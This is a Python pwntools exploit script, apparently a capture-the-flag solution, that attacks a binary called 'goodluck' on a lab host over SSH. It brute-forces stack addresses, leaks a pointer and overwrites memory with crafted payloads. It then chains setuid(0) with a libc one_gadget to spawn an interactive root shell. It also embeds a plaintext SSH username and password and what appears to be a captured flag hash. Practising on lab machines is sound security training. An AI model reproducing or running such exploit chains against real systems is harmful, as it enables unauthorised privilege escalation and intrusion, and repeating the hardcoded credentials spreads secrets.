#! /usr/bin/python
from pwn import *

pwnlib.args.SILENT(True)

def write_payload(file_name, payload):   
    f = open(file_name, 'wb')
    f.write(payload)
    f.close()


#outside gdb:
#python -c "print 'A' * 8 + '\xd8\xf5\xff\xbf'" > ../../tmp/t3
#python -c "print 'A' * 4 + '\x69\x05\x09\x01' + '\xbc\xf5\xff\xbf'" > ../../tmp/t4
# 0xbffff5d8 - 0x1c = 0xbffff5bc

#secret_addr = 0xbffffc18
#secret_addr = 0xbffffdc8   # for {'USER':'root'}
secret_addr = 0xBFFFFDA8 # for {'USER':'root', 'XDG_RUNTIME_DIR':'/run/user/0'}


def leakStack():
    for i in range(0x600, 0xfff, 0x4):
        test_addr = 0xbffff270 + i 
	p3 = 'A' * 8 + p32(test_addr)
        write_payload('p3', p3)
        sh = ssh(host ='10.10.10.27', user = 'xalvas', password = '18547936..*', port = 22)
        sh.upload('p3', '../../tmp/p3')
        s = sh.process('app/goodluck')
        s.recvuntil('Filename:  ')
        s.sendline('../../tmp/p3')
        s.recvuntil('action: ')
        s.sendline('2')
        s.recvline()
        print i, hex(test_addr), ' -> ', s.recvline()

#leakStack()

payload1 = 'A' * 8 + p32(secret_addr)
write_payload('p1', payload1)

sh = ssh(host ='10.10.10.27', user = 'xalvas', password = '18547936..*', port = 22)
sh.upload('p1', '../../tmp/p5')
#s = sh.process('app/goodluck)
#s = sh.process('app/goodluck', env = {'USER':'root'})
s = sh.process('app/goodluck', env = {'USER':'root', 'XDG_RUNTIME_DIR':'/run/user/0'})
#gdb.attach(s, 'b * main')

print s.recvuntil('Filename:  ')
s.sendline('../../tmp/p5')

print s.recvuntil('action: ')
s.sendline('2')

s.recvuntil('debug info: ')
leak = s.recv(9)
print 'leak = ', leak
payload2 = 'AAAA' + p32(int(leak, 16))  + p32(secret_addr - 0x1c)
write_payload('p2', payload2)
sh.upload('p2', '../../tmp/p6')
sleep(1)
print s.recvuntil('action: ')
s.sendline('4')
print s.recvuntil('Filename:  ')
s.sendline('../../tmp/p6')
print s.recvuntil('action: ')
s.sendline('3')

padding = 76

libc_addr = 0xb7e1a000
setuid_offset = 0xb12e0
one_gadget_offset = 0x5fbc5

one_gadget_addr = libc_addr + one_gadget_offset
setuid_addr = libc_addr + setuid_offset # 0xb7ecb2e0	
debug_addr = 0x80000c11

payload3 = 'A' * padding + p32(one_gadget_addr)
write_payload('p3', payload3)


payload4 = 'A' * padding + p32(setuid_addr) + p32(debug_addr) + p32(0)
write_payload('p4', payload4)

sh.upload('p3', '../../tmp/p7')
sh.upload('p4', '../../tmp/p8')

print s.recvuntil('Filename:  ')
s.sendline('../../tmp/p8')  # setuid(0)

print s.recvuntil('Filename:  ')
s.sendline('../../tmp/p7')   # one_gadget
s.interactive()

# 9be653e014d17d1a54f9045e3220743c

















